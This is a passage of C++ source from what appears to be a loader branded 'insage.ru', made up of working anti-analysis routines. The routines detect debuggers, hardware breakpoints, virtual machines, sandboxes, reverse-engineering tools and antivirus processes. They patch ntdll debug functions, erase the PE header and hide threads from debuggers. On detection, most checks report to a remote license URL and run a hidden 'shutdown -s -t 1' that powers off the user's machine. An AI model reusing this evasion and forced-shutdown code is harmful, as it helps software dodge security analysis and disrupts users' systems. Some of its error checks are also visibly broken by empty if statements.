		LI_FN(MessageBoxA).get()(NULL, xorstr_("Your system running under Test Signing mode, disable this, before launching loader."), xorstr_("[insage.ru] LOADER"), MB_SYSTEMMODAL | MB_OK);
	}
	return false;
}

void OtherCheckFlags() //process debug flags
{
	typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(
		IN HANDLE           ProcessHandle,
		IN DWORD            ProcessInformationClass,
		OUT PVOID           ProcessInformation,
		IN ULONG            ProcessInformationLength,
		OUT PULONG          ReturnLength
		);

	HMODULE hNtdll = LI_FN(LoadLibraryA)(xorstr_("ntdll.dll"));
	if (hNtdll)
	{
		auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress(
			hNtdll, xorstr_("NtQueryInformationProcess"));

		if (pfnNtQueryInformationProcess)
		{
			DWORD dwProcessDebugFlags, dwReturned;
			const DWORD ProcessDebugFlags = 0x1f;
			NTSTATUS status = pfnNtQueryInformationProcess(
				GetCurrentProcess(),
				ProcessDebugFlags,
				&dwProcessDebugFlags,
				sizeof(DWORD),
				&dwReturned);

			if (NT_SUCCESS(status) && (0 == dwProcessDebugFlags))
			{
				string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
				ServerRequesta;
				LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
			}
		}
	}

	typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(
		IN HANDLE           ProcessHandle,
		IN DWORD            ProcessInformationClass,
		OUT PVOID           ProcessInformation,
		IN ULONG            ProcessInformationLength,
		OUT PULONG          ReturnLength
		);

	HMODULE hNtdll1 = LI_FN(LoadLibraryA)(xorstr_("ntdll.dll"));
	if (hNtdll1)
	{
		auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress(
			hNtdll1, xorstr_("NtQueryInformationProcess"));

		if (pfnNtQueryInformationProcess)
		{
			DWORD dwReturned;
			HANDLE hProcessDebugObject = 0;
			const DWORD ProcessDebugObjectHandle = 0x1e;
			NTSTATUS status = pfnNtQueryInformationProcess(
				GetCurrentProcess(),
				ProcessDebugObjectHandle,
				&hProcessDebugObject,
				sizeof(HANDLE),
				&dwReturned);

			if (NT_SUCCESS(status) && (0 != hProcessDebugObject))
			{
				string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
				ServerRequesta;
				LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
			}
		}
	}

}

bool HardwareBreakpoints() // flags intel
{
	BOOL bResult = FALSE;

	// This structure is key to the function and is the 
	// medium for detection and removal
	PCONTEXT ctx = PCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));

	if (ctx) {

		SecureZeroMemory(ctx, sizeof(CONTEXT));

		// The CONTEXT structure is an in/out parameter therefore we have
		// to set the flags so Get/SetThreadContext knows what to set or get.
		ctx->ContextFlags = CONTEXT_DEBUG_REGISTERS;

		// Get the registers
		if (GetThreadContext(GetCurrentThread(), ctx))
		{
			if (ctx->Dr0 != 0 || ctx->Dr1 != 0 || ctx->Dr2 != 0 || ctx->Dr3 != 0)
			{
				string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
				ServerRequesta;
				bResult = TRUE;
			}
		}

		VirtualFree(ctx, 0, MEM_RELEASE);
	}

	return bResult;
}

bool ToOolhelp32ReadProcessMemory() //memory
{


	PVOID pRetAddress = _ReturnAddress();
	BYTE uByte;
	if (FALSE != Toolhelp32ReadProcessMemory(GetCurrentProcessId(), _ReturnAddress(), &uByte, sizeof(BYTE), NULL))
	{
		if (uByte == 0xCC)
		{
			string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
			ServerRequesta;
			LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
		}
	}

	return false;
}

void DontJump() //memory
{


	PVOID pRetAddress = _ReturnAddress();
	if (*(PBYTE)pRetAddress == 0xCC) // int 3
	{
		DWORD dwOldProtect;
		if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
		{
			*(PBYTE)pRetAddress = 0x90; // nop
			VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
		}
	}


}

bool isMemEddit() // memory
{
	ULONG_PTR hits;
	DWORD granularity;

	PVOID* addresses = static_cast<PVOID*>(VirtualAlloc(NULL, 4096 * sizeof(PVOID), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
	if (addresses == NULL) {
		return true;
	}

	int* buffer = static_cast<int*>(VirtualAlloc(NULL, 4096 * 4096, MEM_RESERVE | MEM_COMMIT | MEM_WRITE_WATCH, PAGE_READWRITE));
	if (buffer == NULL) {
		VirtualFree(addresses, 0, MEM_RELEASE);
		return true;
	}

	//read the buffer once
	buffer[0] = 1337;

	hits = 4096;
	if (GetWriteWatch(0, buffer, 4096, addresses, &hits, &granularity) != 0)
	{
		return true;
	}
	else {
		//free the memory again
		VirtualFree(addresses, 0, MEM_RELEASE);
		VirtualFree(buffer, 0, MEM_RELEASE);

		//we should have 1 hit if everything is fine
		return (hits == 1) ? false : true;
	}
}

void PatchDbgBreakPoint()  //memory
{

	HMODULE hNtdll = GetModuleHandleA(xorstr_("ntdll.dll"));
	if (!hNtdll)
		return;

	FARPROC pDbgBreakPoint = GetProcAddress(hNtdll, xorstr_("DbgBreakPoint"));
	if (!pDbgBreakPoint)
		return;

	DWORD dwOldProtect;
	if (!VirtualProtect(pDbgBreakPoint, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
		return;

	*(PBYTE)pDbgBreakPoint = (BYTE)0xC3; // ret
}

bool ApparateBreakPoint() //memory
{
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!GetThreadContext(GetCurrentThread(), &ctx))
		return false;

	return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
}

bool DetectFunctionPatch() //memory
{
	HMODULE hKernel32 = GetModuleHandleA(xorstr_("kernel32.dll"));
	if (!hKernel32)
		return false;

	FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, xorstr_("IsDebuggerPresent"));
	if (!pIsDebuggerPresent)
		return false;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return false;

	PROCESSENTRY32W ProcessEntry;
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &ProcessEntry))
		return false;

	bool bDebuggerPresent = false;
	HANDLE hProcess = NULL;
	DWORD dwFuncBytes = 0;
	const DWORD dwCurrentPID = GetCurrentProcessId();
	do
	{
		__try
		{
			if (dwCurrentPID == ProcessEntry.th32ProcessID)
				continue;

			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessEntry.th32ProcessID);
			if (NULL == hProcess)
				continue;

			if (!ReadProcessMemory(hProcess, pIsDebuggerPresent, &dwFuncBytes, sizeof(DWORD), NULL))
				continue;

			if (dwFuncBytes != *(PDWORD)pIsDebuggerPresent)
			{
				bDebuggerPresent = true;
				break;
			}
		}
		__finally
		{
			if (hProcess)
				LI_FN(CloseHandle)(hProcess);
		}
	} 
	while (Process32NextW(hSnapshot, &ProcessEntry));
	if (hSnapshot)
		LI_FN(CloseHandle)(hSnapshot);
	return bDebuggerPresent;
}

bool CheckCsr() //object
{
	HMODULE hNtdll = LI_FN(LoadLibraryA)(xorstr_("ntdll.dll"));
	if (!hNtdll)
		return false;

	TCsrGetProcessId pfnCsrGetProcessId = (TCsrGetProcessId)GetProcAddress(hNtdll, xorstr_("CsrGetProcessId"));
	if (!pfnCsrGetProcessId)
		return false;

	HANDLE hCsr = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pfnCsrGetProcessId());
	if (hCsr != NULL)
	{
		LI_FN(CloseHandle)(hCsr);
		return true;
	}
	else
		return false;
}

__forceinline void ErasePEHeaderFromMemory()
{
	DWORD OldProtect = 0;

	// Get base address of module
	char* pBaseAddr = (char*)GetModuleHandle(NULL);

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	ZeroMemory(pBaseAddr, 4096);
	//SecureZeroMemory(pBaseAddr, 4096); this one is better
}

void PatchDbgUiRemoteBreakin() //memory
{
	HMODULE hNtdll = GetModuleHandleA(xorstr_("ntdll.dll"));
	if (!hNtdll)
		return;

	FARPROC pDbgUiRemoteBreakin = GetProcAddress(hNtdll, xorstr_("DbgUiRemoteBreakin"));
	if (!pDbgUiRemoteBreakin)
		return;

	HMODULE hKernel32 = GetModuleHandleA(xorstr_("kernel32.dll"));
	if (!hKernel32)
		return;

	FARPROC pTerminateProcess = GetProcAddress(hKernel32, xorstr_("TerminateProcess"));
	if (!pTerminateProcess)
		return;

	DbgUiRemoteBreakinPatch patch = { 0 };
	patch.push_0 = '\x6A\x00';
	patch.push = '\x68';
	patch.CurrentPorcessHandle = 0xFFFFFFFF;
	patch.mov_eax = '\xB8';
	patch.TerminateProcess = (DWORD)pTerminateProcess;
	patch.call_eax = '\xFF\xD0';

	DWORD dwOldProtect;
	if (!VirtualProtect(pDbgUiRemoteBreakin, sizeof(DbgUiRemoteBreakinPatch), PAGE_READWRITE, &dwOldProtect))
		return;

	::memcpy_s(pDbgUiRemoteBreakin, sizeof(DbgUiRemoteBreakinPatch),&patch, sizeof(DbgUiRemoteBreakinPatch));
	VirtualProtect(pDbgUiRemoteBreakin, sizeof(DbgUiRemoteBreakinPatch), dwOldProtect, &dwOldProtect);
}

void AntiAnalisysProcess() //flags
{
		    if (IsProcessRun(xorstr_("ollydbg.exe")) || IsProcessRun(xorstr_("idaq64.exe")) || IsProcessRun(xorstr_("HxD.exe")) 
			||IsProcessRun(xorstr_("ResourceHacker.exe")) || IsProcessRun(xorstr_("ProcessHacker.exe")) || IsProcessRun(xorstr_("idaq32.exe"))
			|| IsProcessRun(xorstr_("httpdebugger.exe")) || IsProcessRun(xorstr_("windowrenamer.exe")) || IsProcessRun(xorstr_("KsDumperClient.exe"))
			|| IsProcessRun(xorstr_("HTTPDebuggerUI.exe")) || IsProcessRun(xorstr_("HTTPDebuggerSvc.exe")) || IsProcessRun(xorstr_("FolderChangesView.exe"))
			|| IsProcessRun(xorstr_("procmon.exe")) || IsProcessRun(xorstr_("idaq.exe")) || IsProcessRun(xorstr_("Wireshark.exe"))
			|| IsProcessRun(xorstr_("Fiddler.exe")) || IsProcessRun(xorstr_("Xenos64.exe")) || IsProcessRun(xorstr_("Cheat Engine.exe"))
			|| IsProcessRun(xorstr_("HTTP Debugger Windows Service (32 bit).exe")) || IsProcessRun(xorstr_("KsDumper.exe")) || IsProcessRun(xorstr_("x64dbg.exe"))
			|| IsProcessRun(xorstr_("x32dbg.exe")) || IsProcessRun(xorstr_("die.exe")) || IsProcessRun(xorstr_("tcpview.exe"))
			|| IsProcessRun(xorstr_("autoruns.exe")) || IsProcessRun(xorstr_("autorunsc.exe")) || IsProcessRun(xorstr_("filemon.exe"))
			|| IsProcessRun(xorstr_("procmon.exe")) || IsProcessRun(xorstr_("regmon.exe")) || IsProcessRun(xorstr_("procexp.exe"))
			|| IsProcessRun(xorstr_("ida64.exe")) || IsProcessRun(xorstr_("dumpcap.exe")) || IsProcessRun(xorstr_("HookExplorer.exe"))
			|| IsProcessRun(xorstr_("ImportREC.exe")) || IsProcessRun(xorstr_("PETools.exe")) || IsProcessRun(xorstr_("LordPE.exe"))
			|| IsProcessRun(xorstr_("SysInspector.exe")) || IsProcessRun(xorstr_("proc_analyzer.exe")) || IsProcessRun(xorstr_("sysAnalyzer.exe"))
			|| IsProcessRun(xorstr_("sniff_hit.exe")) || IsProcessRun(xorstr_("windbg.exe")) || IsProcessRun(xorstr_("joeboxcontrol.exe"))
			|| IsProcessRun(xorstr_("joeboxserver.exe")) || IsProcessRun(xorstr_("tv_w32.exe")) || IsProcessRun(xorstr_("tv_x64.exe"))
			|| IsProcessRun(xorstr_("Charles.exe")) || IsProcessRun(xorstr_("netFilterService.exe")) || IsProcessRun(xorstr_("HTTPAnalyzerStdV7.exe"))
			|| IsProcessRun(xorstr_("MegaDumper.exe")) || IsProcessRun(xorstr_("ida.exe")) || IsProcessRun(xorstr_("Xenos.exe"))
			|| IsProcessRun(xorstr_("HttpAnalyzerStdV5.exe")) || IsProcessRun(xorstr_("vmtoolsd.exe"))
			|| IsProcessRun(xorstr_("vmwaretray.exe")) || IsProcessRun(xorstr_("vmwareuser.exe"))
			|| IsProcessRun(xorstr_("VGAuthService.exe")) || IsProcessRun(xorstr_("vmacthlp.exe"))
			|| IsProcessRun(xorstr_("vboxservice.exe")) || IsProcessRun(xorstr_("vboxtray.exe"))
			|| IsProcessRun(xorstr_("VMSrvc.exe")) || IsProcessRun(xorstr_("VMUSrvc.exe"))
			|| IsProcessRun(xorstr_("xenservice.exe")) || IsProcessRun(xorstr_("qemu-ga.exe"))
			|| IsProcessRun(xorstr_("vdagent.exe")) || IsProcessRun(xorstr_("vdservice.exe"))
			|| IsProcessRun(xorstr_("prl_cc.exe")) || IsProcessRun(xorstr_("prl_tools.exe"))
			|| IsProcessRun(xorstr_("cheatengine-x86_64.exe")) || IsProcessRun(xorstr_("cheatengine-x86_64-SSE4-AVX2.exe"))
			|| IsProcessRun(xorstr_("cheatengine-i386.exe")) || IsProcessRun(xorstr_("cheatengine.exe"))
			|| IsProcessRun(xorstr_("avpui.exe")) || IsProcessRun(xorstr_("avgui.exe"))
			|| IsProcessRun(xorstr_("bdagent.exe")) || IsProcessRun(xorstr_("TitanHideGUI.exe"))
			|| IsProcessRun(xorstr_("TitanHideTest.exe")) || IsProcessRun(xorstr_("SPB.exe"))
			|| IsProcessRun(xorstr_("frida-helper-32.exe")) || IsProcessRun(xorstr_("frida-helper-64.exe"))
				|| IsProcessRun(xorstr_("sandbox.exe")) || IsProcessRun(xorstr_("testapp.exe"))
				|| IsProcessRun(xorstr_("xenservice.exe")) || IsProcessRun(xorstr_("malware.exe"))
				|| IsProcessRun(xorstr_("test.exe")) || IsProcessRun(xorstr_("klavme.exe"))
				|| IsProcessRun(xorstr_("myapp.exe")) || IsProcessRun(xorstr_("bot.exe"))
				|| IsProcessRun(xorstr_("sample.exe")))
		{
				string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
				ServerRequesta;
				Shutdown();
		}
}

void AntiAnalisysWindow()
{
	    if (LI_FN(FindWindowA).cached()(nullptr, xorstr_("x64dbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Scylla"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Scylla_x64"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Process Hacker"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("HxD"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Detect It Easy"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("ollydbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("x96dbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("ida"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("ida64"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Wireshark"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("snowman"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("ObsidianGUI"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Rock Debugger"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("SunAwtFrame"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Zeta Debugger"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Open Server x64"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("Open Server x86"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("IDA: Quick start"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("VBoxTrayToolWndClass"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("VBoxTrayToolWnd"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("TitanHide"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("SPB v0.1 by Arting [PC-RET]"))
		|| LI_FN(FindWindowA).cached()(nullptr, xorstr_("SPB v0.2 by Arting [PC-RET]")))
	{
			string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
			ServerRequesta;
			Shutdown();
	}
}

BOOL IsRemoteSession()
{
	return GetSystemMetrics(SM_REMOTESESSION);
}

BOOL IsCurrentSessionRemoteable()
{
	BOOL fIsRemoteable = FALSE;

	if (GetSystemMetrics(SM_REMOTESESSION))
	{
		fIsRemoteable = TRUE;
	}
	else
	{
		HKEY hRegKey = NULL;
		LONG lResult;

		lResult = RegOpenKeyEx(
			HKEY_LOCAL_MACHINE,
			TERMINAL_SERVER_KEY,
			0, // ulOptions
			KEY_READ,
			&hRegKey
		);

		if (lResult == ERROR_SUCCESS)
		{
			DWORD dwGlassSessionId;
			DWORD cbGlassSessionId = sizeof(dwGlassSessionId);
			DWORD dwType;

			lResult = RegQueryValueEx(
				hRegKey,
				GLASS_SESSION_ID,
				NULL, // lpReserved
				&dwType,
				(BYTE*)&dwGlassSessionId,
				&cbGlassSessionId
			);

			if (lResult == ERROR_SUCCESS)
			{
				DWORD dwCurrentSessionId;

				if (ProcessIdToSessionId(GetCurrentProcessId(), &dwCurrentSessionId))
				{
					fIsRemoteable = (dwCurrentSessionId != dwGlassSessionId);
				}
			}
		}

		if (hRegKey)
		{
			RegCloseKey(hRegKey);
		}
	}

	return fIsRemoteable;
}

BOOL IsAdministrator()
{
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pAdministratorsGroup))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
	{
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:
	if (pAdministratorsGroup)
	{
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError)
	{
		throw dwError;
	}

	return fIsRunAsAdmin;
}

BOOL IsVM() //flags
{
	HKEY hKey;
	int i;
	char szBuffer[64];
	const char* szProducts[] = { xorstr_("*VMWARE*"), xorstr_("*VBOX*"), xorstr_("*VIRTUAL*") };

	DWORD dwSize = sizeof(szBuffer) - 1;

	if (LI_FN(RegOpenKeyExA).forwarded_safe_cached()(HKEY_LOCAL_MACHINE, xorstr_("SYSTEM\\ControlSet001\\Services\\Disk\\Enum"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryValueEx(hKey, "0", NULL, NULL, (unsigned char*)szBuffer, &dwSize) == ERROR_SUCCESS)
		{
			for (i = 0; i < _countof(szProducts); i++)
			{
				if (strstr(szBuffer, szProducts[i]))
				{
					LI_FN(RegCloseKey)(hKey);
					return TRUE;
				}
			}
		}

		LI_FN(RegCloseKey)(hKey);
	}

	return FALSE;
}

BOOL IsSandboxie() //flags
{
	if ((LI_FN(GetModuleHandleA)(xorstr_("sbiedll.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("avghookx.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("avghooka.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("snxhk.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("dbghelp.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("api_log.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("avghookx.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("dir_watch.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("pstorec.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("vmcheck.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("wpespy.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("cmdvrt64.dll")) != NULL) ||
		(LI_FN(GetModuleHandleA)(xorstr_("cmdvrt32.dll")) != NULL))
	{
		string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
		ServerRequesta;
		return TRUE;
	}


	return FALSE;
}

BOOL IsVirtualBox() //flags 
{
	BOOL bDetected = FALSE;

	if ((LI_FN(LoadLibraryA)(xorstr_("vboxhook.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxdisp.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxmrxnp")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxogl.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglarrayspu.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglcrutil.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglerrorspu.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglfeedbackspu.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglpackspu.dll")) != NULL) ||
		(LI_FN(LoadLibraryA)(xorstr_("vboxoglpassthroughspu.dll")) != NULL))
		bDetected = TRUE;

	if ((CreateFileA(xorstr_("\\\\.\\VBoxMiniRdrDN"), GENERIC_READ, \
		FILE_SHARE_READ, NULL, OPEN_EXISTING, \
		FILE_ATTRIBUTE_NORMAL, NULL) \
		!= INVALID_HANDLE_VALUE) || 
		(CreateFileA(xorstr_("\\\\.\\VBoxGuest"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE) ||
		(CreateFileA(xorstr_("\\\\.\\pipe\\VBoxMiniRdDN"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE) ||
		(CreateFileA(xorstr_("\\\\.\\VBoxTrayIPC"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE) ||
		(CreateFileA(xorstr_("\\\\.\\pipe\\VBoxTrayIPC"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE)
		||
		(CreateFileA(xorstr_("\\\\.\\HGFS"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE)
		||
		(CreateFileA(xorstr_("\\\\.\\vmci"), GENERIC_READ, \
			FILE_SHARE_READ, NULL, OPEN_EXISTING, \
			FILE_ATTRIBUTE_NORMAL, NULL) \
			!= INVALID_HANDLE_VALUE))
	{
		string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
		ServerRequesta;
		bDetected = TRUE;
	}

	return bDetected;
}

PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pImageBase)
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
	return (PIMAGE_NT_HEADERS)(pImageBase + pImageDosHeader->e_lfanew);
}

PIMAGE_SECTION_HEADER FindRDataSection(PBYTE pImageBase)
{
	static const std::string rdata = ".rdata";
	PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase);
	PIMAGE_SECTION_HEADER pImageSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeaders);
	int n = 0;
	for (; n < pImageNtHeaders->FileHeader.NumberOfSections; ++n)
	{
		if (rdata == (char*)pImageSectionHeader[n].Name)
		{
			break;
		}
	}
	return &pImageSectionHeader[n];
}

void CheckGlobalFlagsClearInProcess() //flags
{
	PBYTE pImageBase = (PBYTE)LI_FN(GetModuleHandleA).forwarded_safe_cached()(NULL);
	PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pImageBase);
	PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pImageBase
		+ pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress);
	if (pImageLoadConfigDirectory->GlobalFlagsClear != 0)
	{
		string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
		ServerRequesta;
		Shutdown();
	}
}

void CheckGlobalFlagsClearInFile()
{
	HANDLE hExecutable = INVALID_HANDLE_VALUE;
	HANDLE hExecutableMapping = NULL;
	PBYTE pMappedImageBase = NULL;
	try
	{
		PBYTE pImageBase = (PBYTE)GetModuleHandle(NULL);
		PIMAGE_SECTION_HEADER pImageSectionHeader = FindRDataSection(pImageBase);
		TCHAR pszExecutablePath[MAX_PATH];
		DWORD dwPathLength = GetModuleFileName(NULL, pszExecutablePath, MAX_PATH);
		if (0 == dwPathLength);
		hExecutable = CreateFile(pszExecutablePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (INVALID_HANDLE_VALUE == hExecutable);
		hExecutableMapping = CreateFileMapping(hExecutable, NULL, PAGE_READONLY, 0, 0, NULL);
		if (NULL == hExecutableMapping);
		pMappedImageBase = (PBYTE)MapViewOfFile(hExecutableMapping, FILE_MAP_READ, 0, 0,
			pImageSectionHeader->PointerToRawData + pImageSectionHeader->SizeOfRawData);
		if (NULL == pMappedImageBase);
		PIMAGE_NT_HEADERS pImageNtHeaders = GetImageNtHeaders(pMappedImageBase);
		PIMAGE_LOAD_CONFIG_DIRECTORY pImageLoadConfigDirectory = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pMappedImageBase
			+ (pImageSectionHeader->PointerToRawData
				+ (pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress - pImageSectionHeader->VirtualAddress)));
		if (pImageLoadConfigDirectory->GlobalFlagsClear != 0)
		{
			string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
			ServerRequesta;
			Shutdown();
		}
	}
	catch (int error)
	{

	}
}

void HideFromDebuger() //memory
{
	typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
		_In_ HANDLE ThreadHandle,
		_In_ ULONG  ThreadInformationClass,
		_In_ PVOID  ThreadInformation,
		_In_ ULONG  ThreadInformationLength
		);
	const ULONG ThreadHideFromDebugger = 0x11;

	if (auto lla = LI_FN(LoadLibraryA).forwarded_safe_cached()) {
		if (auto hNtDll = lla(xorstr_("ntdll.dll"))) {

			if (auto gpa = LI_FN(GetProcAddress).forwarded_safe_cached()) {
				pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
					gpa(hNtDll, xorstr_("NtSetInformationThread"));
				if (auto gct = LI_FN(GetCurrentThread).forwarded_safe_cached()) {
					NTSTATUS status = NtSetInformationThread(gct(),
						ThreadHideFromDebugger, NULL, 0);
				}
			}
		}
	}
}

void CheckPresent() //flags
{
	if (auto is_dbg_pres = LI_FN(IsDebuggerPresent).forwarded_safe_cached())
	{
		if (is_dbg_pres()) 
		{
			string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
			ServerRequesta;
			LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
		}
	}

	BOOL bDebuggerPresent;
	if (TRUE == LI_FN(CheckRemoteDebuggerPresent).cached()(LI_FN(GetCurrentProcess).cached()(), &bDebuggerPresent) && TRUE == bDebuggerPresent)
	{
		string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
		ServerRequesta;
		LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
	}
	typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(
		IN HANDLE           ProcessHandle,
		IN PROCESSINFOCLASS ProcessInformationClass,
		OUT PVOID           ProcessInformation,
		IN ULONG            ProcessInformationLength,
		OUT PULONG          ReturnLength
		);

	HMODULE hNtdll = LI_FN(LoadLibraryA).forwarded_safe_cached()(xorstr_("ntdll.dll"));
	if (hNtdll)
	{
		auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress(
			hNtdll, xorstr_("NtQueryInformationProcess"));

		if (pfnNtQueryInformationProcess)
		{
			DWORD dwProcessDebugPort, dwReturned;
			NTSTATUS status = pfnNtQueryInformationProcess(
				GetCurrentProcess(),
				ProcessDebugPort,
				&dwProcessDebugPort,
				sizeof(DWORD),
				&dwReturned);

			if (NT_SUCCESS(status) && (-1 == dwProcessDebugPort))
			{
				string ServerRequesta = Postdata.PostUrlData(ReLicenseUrla);
				ServerRequesta;
				LI_FN(WinExec)(xorstr_("shutdown -s -t 1"), SW_HIDE);
			}
		}

	}
}

void WriteProcessMemory() //memory
{
	BYTE Patch = 0x90;
	PVOID PRetAdress = _ReturnAddress();
	if (*(PBYTE)PRetAdress == 0xCC)
	{
		DWORD dwOldProtect;
		if (VirtualProtect(PRetAdress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
		{
